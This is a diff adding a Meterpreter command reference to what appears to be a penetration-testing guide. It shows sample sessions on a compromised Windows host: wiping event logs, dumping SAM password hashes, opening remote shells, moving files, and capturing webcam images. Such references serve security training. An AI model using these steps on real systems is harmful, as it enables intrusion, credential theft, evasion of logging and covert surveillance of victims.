@@ -237,6 +237,238 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 User:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 ```
 
+**Moving around**   
+You can perform commands in meterpreter such as:
+
+**help**  
+This will display the meterpreter help menu.
+
+
+   meterpreter > help
+
+   Core Commands
+   =============
+
+      Command       Description
+      -------       -----------
+      ?             Help menu
+      background    Backgrounds the current session
+      channel       Displays information about active channels
+
+
+
+**background**  
+This will send the current meterpreter session to the background and return you to the `msf` prompt.
+
+```
+meterpreter > background
+msf exploit(ms08_067_netapi) > sessions -i 1
+[*] Starting interaction with 1...
+```
+
+
+**cat**  
+This will display the contents of a file when it's given as an arguement
+
+```
+meterpreter > cat file.txt
+This is just a plain text file
+```
+
+
+**cd**  
+This changes the current working directory on the target host
+
+```
+cd c:\\windows
+```
+
+
+**clearev**  
+This clears the *Application*, *System*, and *Security* logs on the Windows target.
+
+```
+meterpreter > clearev
+[*] Wiping 97 records from Application...
+[*] Wiping 415 records from System...
+[*] Wiping 0 records from Security...
+meterpreter >
+```
+
+
+**download**  
+This will download a file from the remote machine, you will need to give double slashes when interacting with a Windows machine
+
+`download c:\\boot.ini`
+
+
+**edit**  
+This is a wrapper around `vim` and allows editing of a file on the target machine.
+
+**execute**  
+This runs a command on the target.
+
+```
+meterpreter > execute -f cmd.exe -i -H
+Process 38320 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>
+```
+
+
+**hashdump**  
+This will dump the contents of the SAM database.
+
+```
+hashdump 
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hashes...
+
+Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
+dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
+victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
+```
+
+
+**ipconfig**  
+This displays the network interfaces and addresses on the remote machine.
+
+```
+meterpreter > ipconfig
+
+MS TCP Loopback interface
+Hardware MAC: 00:00:00:00:00:00
+IP Address  : 127.0.0.1
+Netmask     : 255.0.0.0
+
+AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
+Hardware MAC: 00:0c:29:10:f5:15
+IP Address  : 192.168.1.104
+Netmask     : 255.255.0.0
+```
+
+**ls**  
+This will list the files in the current remote directory.
+
+```
+meterpreter > ls
+
+Listing: C:\Documents and Settings\victim
+=========================================
+
+Mode              Size     Type  Last modified                   Name
+----              ----     ----  -------------                   ----
+40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .
+40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..
+100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel
+40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data
+```
+
+
+**migrate**  
+This will allow you to migrate the current process to another process on the target.
+
+**ps**  
+This displays a list of running processes on the target.
+
+```
+meterpreter > ps
+
+Process list
+============
+
+    PID   Name                  Path
+    ---   ----                  ----
+    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe
+    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe
+    288   snmp.exe              C:\WINDOWS\System32\snmp.exe
+```
+
+
+**search**  
+This provides a way of locating specific files on the target host. 
+
+```
+meterpreter > search -f autoexec.bat
+Found 1 result...
+    c:\AUTOEXEC.BAT
+```
+
+**shell**  
+This will present you with a standard shell on the target system.
+
+```
+meterpreter > shell
+Process 39640 created.
+Channel 2 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>
+```
+
+
+**upload**  
+This allows you to upload a file on the target machine, you will need to give double slashes when interacting with a Windows machine
+
+`upload file.exr c:\\users`
+
+
+**webcam_list**  
+This will display currently available web cams on the target host.
+
+```
+meterpreter > webcam_list
+1: Creative WebCam NX Pro
+2: Creative WebCam NX Pro (VFW)
+```
+
+
+**webcam_snap**  
+This grabs a picture from a connected web cam on the target system, and saves it to disc as a JPEG image. By default, the save location is the local current working directory with a randomized filename.
+
+```
+meterpreter > webcam_snap -h
+Usage: webcam_snap [options]
+Grab a frame from the specified webcam.
+
+OPTIONS:
+
+    -h      Help Banner
+    -i   The index of the webcam to use (Default: 1)
+    -p   The JPEG image path (Default: 'gnFjTnzi.jpeg')
+    -q   The JPEG image quality (Default: '50')
+    -v   Automatically view the JPEG image (Default: 'true')
+
+```
+
+
+```
+meterpreter > webcam_snap -i 1 -v false
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /home/Offsec/YxdhwpeQ.jpeg
+```
+
+
+
+
+
+
+
+
+
 
 
 
